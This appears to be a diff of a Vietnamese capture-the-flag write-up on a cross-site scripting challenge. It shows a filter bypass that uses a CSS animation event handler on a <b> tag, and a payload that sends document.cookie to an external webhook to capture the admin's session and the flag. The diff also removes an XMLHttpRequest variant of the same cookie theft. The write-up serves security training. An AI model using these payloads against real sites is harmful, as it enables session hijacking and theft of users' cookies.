@@ -126,16 +126,14 @@ Mình chọn tag `<b>` làm vector tấn công sau đó sử dụng XSS cheat sh
 <style>@keyframes x{}</style><b style="animation-name:x" onwebkitanimationstart="print()"></b>
 ```
 ![[Attachments/Pasted image 20261101144137.png]]
-Ý tưởng dùng print() thay cho alert(1) mình cũng đọc trong một bài báo trước mình đọc ở Port Swigger :D Do ở đây `alert` đã nằm trong keyword bị cấm. 
+Ý tưởng dùng print() thay cho alert(1) mình cũng đọc trong một bài báo ở Port Swigger :D Do ở đây `alert` đã nằm trong keyword bị cấm: https://portswigger.net/research/alert-is-dead-long-live-print
 
 ```html
 <style>@keyframes x{}</style>
 <b style="animation-name:x" onwebkitanimationstart="fetch('https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net/?c='+document.cookie)"></b>
 ```
 
-<style>@keyframes x{}</style>
-<b style="animation-name:x" onwebkitanimationstart="
-  var xhttp = new XMLHttpRequest();
-  xhttp.open('GET', 'https://7f66658a-2b27-47ed-80ff-545eca5c9dba.webhooksite.net/exfil_by_rq_get/c?c=' + document.cookie, true);
-  xhttp.send();
-"></b>
+![[Attachments/Pasted image 20261101145158.png]]
+
+Gửi cho Admin và mình dễ dàng có được Flag:
+![[Attachments/Pasted image 20261101145327.png]]
